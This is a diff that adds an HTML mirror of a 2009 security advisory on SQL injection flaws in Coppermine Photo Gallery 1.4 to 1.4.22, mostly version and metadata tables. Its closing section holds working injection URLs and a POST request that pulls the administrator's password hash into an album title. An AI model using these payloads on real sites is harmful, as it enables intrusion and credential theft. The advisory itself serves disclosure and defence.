@@ -1,0 +1,144 @@
+#SpeeDr00t@Black Falcon<br>#bid35009<p><b><span style="font-size: 18pt;">Coppermine Photo Gallery Multiple SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/35009/info">info</a><br><a href="http://www.securityfocus.com/bid/35009/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/35009/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/35009/solution">solution</a><br><a href="http://www.securityfocus.com/bid/35009/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				35009
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 18 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 19 2009 11:20PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				girex
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Coppermine Photo Gallery 1.4.22 <br/>
+					
+				
+					Coppermine Photo Gallery 1.4.21 <br/>
+					
+				
+					Coppermine Photo Gallery 1.4.20 <br/>
+					
+				
+					Coppermine Photo Gallery 1.4.18 <br/>
+					
+				
+					Coppermine Photo Gallery 1.4.17 <br/>
+					
+				
+					Coppermine Photo Gallery 1.4.16 <br/>
+					
+				
+					Coppermine Photo Gallery 1.4.15 <br/>
+					
+				
+					Coppermine Photo Gallery 1.4.14 <br/>
+					
+				
+					Coppermine Photo Gallery 1.4.13 <br/>
+					
+				
+					Coppermine Photo Gallery 1.4.12 <br/>
+					
+				
+					Coppermine Photo Gallery 1.4.11 <br/>
+					
+				
+					Coppermine Photo Gallery 1.4.10 <br/>
+					
+				
+					Coppermine Photo Gallery 1.4.9 <br/>
+					
+				
+					Coppermine Photo Gallery 1.4.4 <br/>
+					
+				
+					Coppermine Photo Gallery 1.4.3 <br/>
+					
+				
+					Coppermine Photo Gallery 1.4.2 <br/>
+					
+				
+					Coppermine Photo Gallery 1.4 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x36000/35009/35009.pl">#exploit_35009.pl</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit these issues.<br/><br/>The following example data and URIs are available:<br/><br/>http://www.example.com/path/thumnails.php?album=alpha&amp;amp;GLOBALScat=99999' OR 1=1%23    true<br/>http://www.example.com/path/thumnails.php?album=alpha&amp;amp;GLOBALScat=99999' OR 1=2%23    false<br/><br/>POST /path/db_input.php HTTP/1.1<br/>Host: host<br/>Keep-Alive: 300<br/>Connection: keep-alive<br/>Cookie: your_cookies<br/>Content-Type: application/x-www-form-urlencoded<br/><br/>event=album_update&amp;amp;title=x&amp;amp;aid=YOUR_ALBUM_ID&amp;amp;alb_password=%5C&amp;amp;alb_password_hint=,title=(SELECT user_password FROM cpg14x_users WHERE user_id=1) WHERE aid=YOUR_ALBUM_ID%23<br/><br/>http://www.example.com/path/displayecard.php?data=$injection HTTP/1.1<br/><br/><br/>The following exploit is available:
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/35009.pl">/data/vulnerabilities/exploits/35009.pl</a></li>
+</ul>
+</div>
